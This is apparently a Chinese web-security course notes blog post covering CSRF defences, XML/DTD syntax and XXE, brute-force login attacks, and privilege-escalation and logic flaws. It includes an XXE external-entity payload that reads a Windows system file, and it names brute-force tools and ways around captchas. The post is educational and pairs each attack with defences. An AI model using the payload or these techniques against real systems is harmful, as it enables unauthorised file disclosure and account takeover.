<h2 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击。</p>
<h3 id="在请求地址中添加-token-并验证"><a href="#在请求地址中添加-token-并验证" class="headerlink" title="在请求地址中添加 token 并验证"></a>在请求地址中添加 token 并验证</h3><p>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
<h3 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h3><p>Referer字段用来记录该HTTP请求的来源地址。</p>
<ul>
<li>验证referer通过———&gt;合法请求</li>
<li>验证referer不通过———&gt;不合法请求</li>
</ul>
<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="XXE介绍"><a href="#XXE介绍" class="headerlink" title="XXE介绍"></a>XXE介绍</h2><p>XML被称为可扩展标记语⾔，与HTML类似，但是HTML中的标签都是预定义(预先定义好每个标签的作⽤)的，⽽XML语⾔中的标签都是⾃定义(可以⾃⼰定义标签的名称、属性、值、作⽤)的；HTML中的标签可以是单标</p>
<p>签，⽽XML中的标签必须是成对出现。</p>
<p>​	HTML语⾔主要⽤来展示内容，⽽XML语⾔⽤来传输数据。</p>
<h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><p>语法规则</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">XML语⾔严格区分⼤⼩写，⽽HTML语⾔不区分⼤⼩写;</span><br><span class="line">XML语⾔只能有⼀个根标签;</span><br><span class="line">HTML语⾔中的属性值可以不⽤引号引起来，但是XML语⾔中的属性值必须⽤引号引起来；</span><br><span class="line">XML中的标签必须成对出现;</span><br><span class="line"> HTML：</span><br><span class="line"> &lt;img 属性=&quot;属性的值&quot;&gt;</span><br><span class="line"> XML：</span><br><span class="line"> &lt;security&gt;&lt;/security&gt;</span><br><span class="line">XML会对特殊字符进⾏实体转义，需要转义的字符如下：</span><br><span class="line">标签之间不能交叉编写;</span><br></pre></td></tr></table></figure>

<img src="/img/oldboy/image-20250312135416815.png" alt="image-20250312135416815" style="zoom: 25\%;" />

<p>文档结构</p>
<p>​	XML文档有xml声明、DTD文档类型、文档元素三部分组成。</p>
<h4 id="XML文档声明"><a href="#XML文档声明" class="headerlink" title="XML文档声明"></a>XML文档声明</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ecoding=&quot;utf-8&quot; ?&gt; </span><br><span class="line">&lt;!-- 声明部分可有可无，但是建议写上--&gt;</span><br></pre></td></tr></table></figure>

<h4 id="DTD文档类型"><a href="#DTD文档类型" class="headerlink" title="DTD文档类型"></a>DTD文档类型</h4><h5 id="DTD文档中的关键字"><a href="#DTD文档中的关键字" class="headerlink" title="DTD文档中的关键字"></a>DTD文档中的关键字</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DOCTYPE（DTD的声明）</span><br><span class="line">ENTITY（实体的声明）</span><br><span class="line">ELEMENT（定义元素）</span><br><span class="line">SYSTEM、PUBLIC（外部资源申请）</span><br></pre></td></tr></table></figure>



<p>XML文档元素</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;urf-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE security [</span><br><span class="line">	&lt;?ELEMENT security (network,OS,websec,LAN)&gt;]&gt;</span><br><span class="line">&lt;security&gt;</span><br><span class="line">	&lt;network&gt;1&lt;/network&gt;</span><br><span class="line">	&lt;OS&gt;1&lt;/OS&gt;</span><br><span class="line">	&lt;websec&gt;web&lt;/websec&gt;</span><br><span class="line">    &lt;LAN&gt;lan&lt;/LAN&gt;</span><br><span class="line">&lt;/security&gt;</span><br></pre></td></tr></table></figure>





<h4 id="DTD声明类型"><a href="#DTD声明类型" class="headerlink" title="DTD声明类型"></a>DTD声明类型</h4><h5 id="内部声明"><a href="#内部声明" class="headerlink" title="内部声明"></a>内部声明</h5><p>语法格式</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>案例如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE security [</span><br><span class="line">	&lt;!ELEMENT security (network,OS,websec,LAN)&gt;</span><br><span class="line"><span class="meta prompt_">]&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="外部声明"><a href="#外部声明" class="headerlink" title="外部声明"></a>外部声明</h5><p>语法格式</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;外部⽂件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>案例如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/windows/system.ini&quot;&gt;</span><br><span class="line"><span class="meta prompt_">]&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h5><p>参数实体⽤“% 实体名称”声明，引⽤时也⽤“% 实体名称”；其余实体直接⽤实体名称声明，引⽤时⽤“&amp;实体名称;”。参数实体只能在DTD中声明，DTD中引⽤；其余实体只能在DTD中声明，可以在XML⽂档中引⽤。所谓的实体就是预先定义好的数据或者数据的集合。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内部实体：&lt;!ENTITY 实体名称 “实体的值”&gt;</span><br><span class="line">外部实体：&lt;!ENTITY 实体名称 SYSTEM “URL”&gt;</span><br><span class="line">参数实体：&lt;!ENTITY \% 实体名称 “实体的值”&gt;或者&lt;!ENTITY \% 实体名称 SYSTEM “URL” &gt;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞基础"><a href="#漏洞基础" class="headerlink" title="漏洞基础"></a>漏洞基础</h2><p>1、漏洞形成原因</p>
<p>XXE被称为外部实体注⼊漏洞。XXE漏洞的形成主要是程序在解析XML⽂档输⼊时，没有禁⽌外部实体的加载，导致可加载外部的恶意⽂件，造成⽂件读取、命令执⾏、内⽹端⼝扫描、攻击内⽹⽹站。</p>
<p>2、支持的伪协议</p>
<p><img src="/img/oldboy/image-20250312141105892.png" alt="image-20250312141105892"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file:⽤来加载本地⽂件</span><br><span class="line">http:⽤来加载远程⽂件</span><br><span class="line">ftp:⽤来访问ftp服务器上的⽂件</span><br><span class="line">php:⽤来读取php源码,php://filter</span><br></pre></td></tr></table></figure>



<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ol>
<li>探测内网端口</li>
<li>攻击内网网站</li>
<li>任意读取本地文件&#x2F;远程读取文件</li>
<li>读取PHP源码</li>
</ol>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1、经用是外部实体</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHP：libxml_disable_entity_loader(true);</span><br><span class="line">java:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">python:</span><br><span class="line">rom lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>

<p>2、过滤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">预定义字符转义：&lt; &amp;lt; &gt; &amp;gt; &amp; &amp;amp; ‘ &amp;apos; “ &amp;quot;</span><br><span class="line">过滤⽤户提交的XML数据，关键词：SYSTEM和PUBLIC</span><br><span class="line">禁⽤外部实体：libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>











<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="漏洞介绍-3"><a href="#漏洞介绍-3" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>暴力破解：实际上就是使用枚举方法，将密码逐个进行猜解，获取真正密码。</p>
<h3 id="C-S架构破解"><a href="#C-S架构破解" class="headerlink" title="C&#x2F;S架构破解"></a>C&#x2F;S架构破解</h3><p> C&#x2F;S即客户端&#x2F;服务器,基于C&#x2F;S架构的应用程序 如 ssh ftp sql-server mysql 等，这些服务往往提供一个高权限的用户，而这个高权限的用户往往可以进行执行命令的操作，如 sql-server 的 sa ，mysql的root，oracle的sys和system帐号，使用这些高权限的用户能在很大程度上给开发人员带来方便，但如果口令被破解带来的危害也是相当大的。</p>
<p>C&#x2F;S架构主要使用的破解工具 <strong>Hydra、Bruter、X-scan</strong></p>
<h3 id="B-S架构破解"><a href="#B-S架构破解" class="headerlink" title="B&#x2F;S架构破解"></a>B&#x2F;S架构破解</h3><p>一般是对web应用程序中的高权限用户进行猜解，如网站的内容管理系统账户。一般针对 B&#x2F;S的暴力猜解，使用Burp Suit 镜像表单爆破。</p>
<p>API接口暴力猜解参考   <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6330">https://xz.aliyun.com/t/6330</a></p>
<p><strong>破解方法</strong></p>
<ul>
<li><p><strong>基于表单的暴力破解</strong></p>
<p>直接使用暴力破解工具即可</p>
</li>
<li><p><strong>基于验证码的暴力破解</strong></p>
<ul>
<li>on client常见问题<ul>
<li>在前端进行验证码验证；不安全的将验证码泄露在cookie中；不安全的将验证码在前端源代码中泄露</li>
</ul>
</li>
<li>on server常见问题<ul>
<li>验证码在后台不过期，导致长时间使用（php默认session时间为24分钟）；验证码校验不严格，逻辑出现问题；验证码过于简单</li>
</ul>
</li>
<li>弱特证码识别攻击</li>
</ul>
</li>
<li><p><strong>基于token破解</strong></p>
<p>由于token值输出在前端源代码中，容易被获取，因此也就失去了防暴力破解的意义，一般Token在防止CSRF上会有比较好的功效。</p>
</li>
</ul>
<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>查找漏洞前注意事项</strong></p>
<ol>
<li>首先需要一个有效的字典（如top10常用密码字典）</li>
<li>判断暴力破解的页面的密码复杂度</li>
<li>网站是否存在验证码</li>
<li>是否对登录行为有限制</li>
<li>是否有token，双因素等验证信息</li>
</ol>
<p><strong>登录页面可能产生的漏洞</strong></p>
<img src="/img/oldboy/image-20250315215838059.png" alt="image-20250315215838059" style="zoom: 65\%;" />



<h2 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h2><ol>
<li>强制要求输入验证码，否则，必须实施IP策略。 注意不要被X-Forwaded-For绕过了！</li>
<li>验证码只能用一次，用完立即过期！不能再次使用</li>
<li>验证码不要太弱。扭曲、变形、干扰线条、干扰背景色、变换字体等。</li>
<li>大网站最好统一安全验证码，各处使用同一个验证码接口。</li>
</ol>
<h1 id="越权与逻辑漏洞"><a href="#越权与逻辑漏洞" class="headerlink" title="越权与逻辑漏洞"></a>越权与逻辑漏洞</h1><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><h3 id="越权基础"><a href="#越权基础" class="headerlink" title="越权基础"></a>越权基础</h3><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称为越权操作</p>
<p>形成原因：后台使用了不合理的权限校验规则导致的（没有验证session会话信息&#x2F;验证权限）。</p>
<p><strong>权限分类</strong></p>
<p>平行越权:</p>
<p>​	A用户和B用户属于同一级别的用户，但各自不能操作对方的个人信息，A用户如果可以操作B用户的个人信息的情况称为水平越权。</p>
<p>​	简而言之：可以对相同权限的用户进行操作。</p>
<p>​	防御方法：可以使用session会话来进行校验是否为同一用户操作。</p>
<p>垂直越权：</p>
<p>​	A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。</p>
<p>​	简而言之：对比自己权限高的用户进行操作。</p>
<p>​	防御方法：对用户权限和身份信息进行校验。</p>
<h3 id="越权发现"><a href="#越权发现" class="headerlink" title="越权发现"></a>越权发现</h3><p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p>
<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><h3 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU1NzgyMzA0OA==&mid=2247487316&idx=1&sn=a26a2a40ebade542c94b6a0c00d30f9a&chksm=fc2eaa73cb592365bab11302efc94e86a024fc73e6aee8a09be693432e25b7ff40be46dcb714&mpshare=1&srcid=0307h5NtXaku1riA6ObM2e1l&sharer_sharetime=1646647976027&sharer_shareid=9dabdbed893bcfec2f742c97df072b91&from=singlemessage&scene=1&subscene=10000&clicktime=1646705651&enterid=1646705651#rd">支付逻辑漏洞思路小集合</a></p>
<p><img src="/img/oldboy/image-20250316171220849.png" alt="image-20250316171220849"></p>
<p>确定业务流程—&gt;寻找流程中可以被操控的环节—&gt;分析可被操控环节中可能产生的逻辑问题—&gt;尝试修改参数触发逻辑问题</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">GoldY</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/12/oldboy2/">http://example.com/2025/05/12/oldboy2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E8%80%81%E7%94%B7%E5%AD%A9%E5%AE%89%E5%85%A8/">老男孩安全</a></div><div class="post-share"><div class="social-share" data-image="/img/oldboy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/zhifubao.jpg" target="_blank"><img class="post-qr-code-img" src="/img/zhifubao.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/12/oldboy1/" title="老男孩--信息收集(1)"><img class="cover" src="/img/oldboy.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">老男孩--信息收集(1)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/05/12/oldboy3/" title="老男孩--手机端信息收集及渗透(3)"><img class="cover" src="/img/oldboy.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">老男孩--手机端信息收集及渗透(3)</div></div><div class="info-2"><div class="info-item-1">——–APP———-APP资产收集APP中含有连接服务器的相关域名、IP等信息，通过相关工具即可实现提取 AppInfoScanner项目地址：kelvinBen&#x2F;AppInfoScanner 一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。 使用配置： 12cd AppInfoScannerpython -m pip install -r requirements.txt    运行方法： 12345678#扫描Android应用的APK文件、DEX文件、需要下载的APK文件下载地址、保存需要扫描的文件的目录python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/05/12/oldboy1/" title="老男孩--信息收集(1)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--信息收集(1)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/05/12/oldboy3/" title="老男孩--手机端信息收集及渗透(3)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--手机端信息收集及渗透(3)</div></div><div class="info-2"><div class="info-item-1">——–APP———-APP资产收集APP中含有连接服务器的相关域名、IP等信息，通过相关工具即可实现提取 AppInfoScanner项目地址：kelvinBen&#x2F;AppInfoScanner 一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。 使用配置： 12cd AppInfoScannerpython -m pip install -r requirements.txt    运行方法： 12345678#扫描Android应用的APK文件、DEX文件、需要下载的APK文件下载地址、保存需要扫描的文件的目录python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File...</div></div></div></a><a class="pagination-related" href="/2025/05/12/oldboy4/" title="老男孩--DDOS攻击与防御(4)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--DDOS攻击与防御(4)</div></div><div class="info-2"><div class="info-item-1">基础知识本教程仅在合法授权的情况下进行测试和研究，请勿用于其他用途。未经授权使用此类工具可能会侵犯他人隐私，触犯相关法律，任何因此引发的法律或利益纠纷与本人无关。 DDOS介绍DOS攻击：指的是采取一对一的方式，攻击目标服务器，使攻击目标CPU使用率提高，网络可以带宽减少等方式耗尽服务器的资源 DDOS攻击：攻击指借助于客户&#x2F;服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DoS攻击，从而成倍地提高拒绝服务攻击的威力。 被攻击时的现象：  被攻击的主机上有大量等待的TCP连接。 网络中充斥着大量的无用的数据包，源地址为假。 制造高流量无用数据，造成网络拥塞，使被攻击的主机无法正常通信。 利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求。 严重时会造成系统死机。  DDOS类型流量型攻击ICMP Flood攻击攻击介绍攻击原理：就是向目标发送大量的 ICMP Echo-Reply（type 0，code 0）或 Echo-Request（type...</div></div></div></a><a class="pagination-related" href="/2025/05/12/oldboy5/" title="老男孩--内网渗透(5)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--内网渗透(5)</div></div><div class="info-2"><div class="info-item-1">获取webshell方法总结CMS获取webshell什么是CMS ​	CMS系统指的是内容管理系统。已经有别人开发好了整个网站的前后端，使用者只需要部署cms，然后通过后台添加数据，修改图片等工作，就能搭建好一个的WEB系统。 如何搜寻CMS信息 ​	常见方法：[信息收集-CMS识别-CSDN博客](https://blog.csdn.net/m0_37856131/article/details/122924979#:~:text=到您要检查的网站--&gt;按 Ctrl %2B U 显示页面代码—&gt;在 html 页面上找到前缀为meta name%3D”generator”content%3D的标签—&gt;引擎名称将在“内容”一词后用引号表示,js 文件路径的行中。 例如，wp-includes 和 wp-content 表明该网站由 Wordpress 提供支持) 在线信息收集网站国内http://whatweb.bugscaner.com        #识别CMS插件 https://www.yunsee.cn                   ...</div></div></div></a><a class="pagination-related" href="/2025/05/12/xiaodi-1/" title="小迪安全--基础讲解(1)"><img class="cover" src="/img/xiao_f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">小迪安全--基础讲解(1)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/05/12/xiaodi-2/" title="小迪安全--信息打点(2)"><img class="cover" src="/img/xiao_f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">小迪安全--信息打点(2)</div></div><div class="info-2"><div class="info-item-1">业务资产查询平台：    小蓝本 https://www.xiaolanben.com/    爱企查 https://aiqicha.baidu.com/   业务类型 WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6. 其他产品等 Web应用工具大全 [~]#棱角 ::Edge.Forum 主要资产内容  WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6....</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">GoldY</div><div class="author-info-description">不经一番寒彻骨，怎得梅花扑鼻香。</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yuwenjin666"><i class="fab fa-github"></i><span>Github主页</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">联系我V：GoldY_66</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">注入概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E6%9F%A5%E6%89%BE"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞点查找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.1.</span> <span class="toc-text">通过错误信息获取漏洞信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%9B%B2%E6%B3%A8%E7%9A%84%E6%96%B9%E5%BC%8F%E8%8E%B7%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.2.</span> <span class="toc-text">通过盲注的方式获取漏洞信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞提交方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E6%8F%90%E4%BA%A4"><span class="toc-number">1.4.1.</span> <span class="toc-text">GET 方式进行提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E6%8F%90%E4%BA%A4"><span class="toc-number">1.4.2.</span> <span class="toc-text">POST方式进行提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E6%8F%90%E4%BA%A4"><span class="toc-number">1.4.3.</span> <span class="toc-text">Cookie方式进行提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HEAD%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E6%8F%90%E4%BA%A4"><span class="toc-number">1.4.4.</span> <span class="toc-text">HEAD方式进行提交</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.5.1.</span> <span class="toc-text">数字类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.5.2.</span> <span class="toc-text">字符类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.5.3.</span> <span class="toc-text">搜索类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.5.4.</span> <span class="toc-text">特殊类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">1.6.</span> <span class="toc-text">攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#union%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.1.</span> <span class="toc-text">union注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#information-schema%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.2.</span> <span class="toc-text">information_schema注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.3.</span> <span class="toc-text">报错函数注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.4.</span> 